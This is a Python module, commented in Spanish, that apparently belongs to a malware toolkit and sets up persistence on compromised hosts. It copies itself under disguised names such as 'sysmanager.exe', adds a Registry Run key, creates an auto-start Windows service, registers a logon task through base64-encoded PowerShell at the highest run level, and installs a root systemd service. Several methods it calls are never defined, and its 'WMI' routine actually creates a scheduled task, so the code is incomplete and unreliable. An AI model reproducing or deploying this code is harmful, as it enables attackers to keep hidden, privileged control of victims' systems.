"""
Módulo de persistencia avanzada.
Implementa múltiples técnicas para mantener la persistencia en el sistema
utilizando diferentes vectores y mecanismos de supervivencia.
"""

import os
import sys
import shutil
import winreg
import subprocess
import base64
import logging
from datetime import datetime
import platform
import ctypes
from .registry_manager import write_registry_key, delete_registry_key

class PersistenceManager:
    def __init__(self):
        """Inicializa el administrador de persistencia."""
        self.sistema = platform.system().lower()
        self.tecnicas_usadas = []
        self.current_path = os.path.abspath(sys.argv[0])
        
    def establecer_persistencia_completa(self):
        """
        Intenta establecer persistencia usando múltiples técnicas.
        Retorna un diccionario con los resultados de cada técnica.
        """
        resultados = {
            "success": False,
            "tecnicas_exitosas": [],
            "tecnicas_fallidas": [],
            "error": None
        }
        
        try:
            if self.sistema == "windows":
                tecnicas = [
                    self._persistencia_registro_run,
                    self._persistencia_registro_runonce,
                    self._persistencia_tarea_programada,
                    self._persistencia_inicio_windows,
                    self._persistencia_wmi,
                    self._persistencia_servicio_windows
                ]
            else:  # Linux
                tecnicas = [
                    self._persistencia_crontab,
                    self._persistencia_systemd,
                    self._persistencia_bashrc,
                    self._persistencia_profile,
                    self._persistencia_init_d
                ]
            
            for tecnica in tecnicas:
                try:
                    resultado = tecnica()
                    if resultado["success"]:
                        resultados["tecnicas_exitosas"].append({
                            "nombre": tecnica.__name__,
                            "detalles": resultado.get("detalles", "")
                        })
                    else:
                        resultados["tecnicas_fallidas"].append({
                            "nombre": tecnica.__name__,
                            "error": resultado.get("error", "Error desconocido")
                        })
                except Exception as e:
                    resultados["tecnicas_fallidas"].append({
                        "nombre": tecnica.__name__,
                        "error": str(e)
                    })
            
            resultados["success"] = len(resultados["tecnicas_exitosas"]) > 0
            
        except Exception as e:
            resultados["error"] = str(e)
        
        return resultados

    def _persistencia_registro_run(self):
        """Establece persistencia usando el registro Run."""
        try:
            nombre_valor = "SystemManager"
            ruta_destino = os.path.join(os.environ["APPDATA"], "System", "sysmanager.exe")
            
            # Crear directorio si no existe
            os.makedirs(os.path.dirname(ruta_destino), exist_ok=True)
            
            # Copiar ejecutable
            shutil.copy2(self.current_path, ruta_destino)
            
            # Añadir al registro
            resultado = write_registry_key(
                "HKCU",
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                nombre_valor,
                ruta_destino
            )
            
            if resultado["success"]:
                return {
                    "success": True,
                    "detalles": f"Persistencia establecida en {ruta_destino}"
                }
            else:
                return {
                    "success": False,
                    "error": resultado.get("error", "Error al escribir en el registro")
                }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _persistencia_servicio_windows(self):
        """Establece persistencia creando un servicio de Windows."""
        try:
            nombre_servicio = "SystemHealthManager"
            ruta_destino = os.path.join(os.environ["PROGRAMFILES"], "System", "healthmanager.exe")
            
            # Crear directorio y copiar archivo
            os.makedirs(os.path.dirname(ruta_destino), exist_ok=True)
            shutil.copy2(self.current_path, ruta_destino)
            
            # Crear servicio
            cmd = f'sc create "{nombre_servicio}" binPath= "{ruta_destino}" start= auto'
            resultado = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if resultado.returncode == 0:
                # Iniciar servicio
                subprocess.run(f'sc start "{nombre_servicio}"', shell=True)
                return {
                    "success": True,
                    "detalles": f"Servicio {nombre_servicio} creado y iniciado"
                }
            else:
                return {
                    "success": False,
                    "error": resultado.stderr
                }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _persistencia_wmi(self):
        """Establece persistencia usando WMI."""
        try:
            nombre_tarea = "SystemMonitor"
            script = f"""
            $Action = New-ScheduledTaskAction -Execute '{self.current_path}'
            $Trigger = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -TaskName '{nombre_tarea}' -Action $Action -Trigger $Trigger -RunLevel Highest -Force
            """
            
            encoded_script = base64.b64encode(script.encode('utf16le')).decode()
            cmd = f'powershell -EncodedCommand {encoded_script}'
            
            resultado = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if resultado.returncode == 0:
                return {
                    "success": True,
                    "detalles": f"Tarea WMI {nombre_tarea} creada"
                }
            else:
                return {
                    "success": False,
                    "error": resultado.stderr
                }
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ... Métodos para Linux ...
    def _persistencia_systemd(self):
        """Establece persistencia usando systemd."""
        try:
            nombre_servicio = "system-monitor"
            ruta_servicio = f"/etc/systemd/system/{nombre_servicio}.service"
            
            contenido_servicio = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart={self.current_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            
            # Crear archivo de servicio
            with open(ruta_servicio, 'w') as f:
                f.write(contenido_servicio)
            
            # Recargar systemd y habilitar servicio
            subprocess.run("systemctl daemon-reload", shell=True)
            subprocess.run(f"systemctl enable {nombre_servicio}", shell=True)
            subprocess.run(f"systemctl start {nombre_servicio}", shell=True)
            
            return {
                "success": True,
                "detalles": f"Servicio systemd {nombre_servicio} creado y activado"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def eliminar_persistencia(self):
        """
        Intenta eliminar todas las formas de persistencia establecidas.
        Retorna un diccionario con los resultados de la limpieza.
        """
        resultados = {
            "success": True,
            "eliminadas": [],
            "errores": []
        }
        
        # Lista de técnicas de limpieza según el sistema
        if self.sistema == "windows":
            tecnicas_limpieza = [
                self._limpiar_registro_run,
                self._limpiar_servicios,
                self._limpiar_tareas_programadas
            ]
        else:
            tecnicas_limpieza = [
                self._limpiar_systemd,
                self._limpiar_crontab,
                self._limpiar_archivos_inicio
            ]
        
        # Ejecutar cada técnica de limpieza
        for tecnica in tecnicas_limpieza:
            try:
                resultado = tecnica()
                if resultado["success"]:
                    resultados["eliminadas"].append(resultado["detalles"])
                else:
                    resultados["errores"].append(resultado["error"])
            except Exception as e:
                resultados["errores"].append(str(e))
        
        resultados["success"] = len(resultados["errores"]) == 0
        return resultados

    def verificar_persistencia(self):
        """
        Verifica qué métodos de persistencia están actualmente establecidos.
        Retorna un diccionario con el estado de cada método.
        """
        estado = {
            "metodos_activos": [],
            "metodos_inactivos": [],
            "error": None
        }
        
        try:
            if self.sistema == "windows":
                # Verificar registro Run
                if self._verificar_registro_run():
                    estado["metodos_activos"].append("Registro Run")
                else:
                    estado["metodos_inactivos"].append("Registro Run")
                
                # Verificar servicios
                if self._verificar_servicio_windows():
                    estado["metodos_activos"].append("Servicio Windows")
                else:
                    estado["metodos_inactivos"].append("Servicio Windows")
                
                # Verificar tareas programadas
                if self._verificar_tarea_programada():
                    estado["metodos_activos"].append("Tarea Programada")
                else:
                    estado["metodos_inactivos"].append("Tarea Programada")
            
            else:  # Linux
                # Verificar systemd
                if self._verificar_systemd():
                    estado["metodos_activos"].append("Systemd Service")
                else:
                    estado["metodos_inactivos"].append("Systemd Service")
                
                # Verificar crontab
                if self._verificar_crontab():
                    estado["metodos_activos"].append("Crontab")
                else:
                    estado["metodos_inactivos"].append("Crontab")
        
        except Exception as e:
            estado["error"] = str(e)
        
        return estado
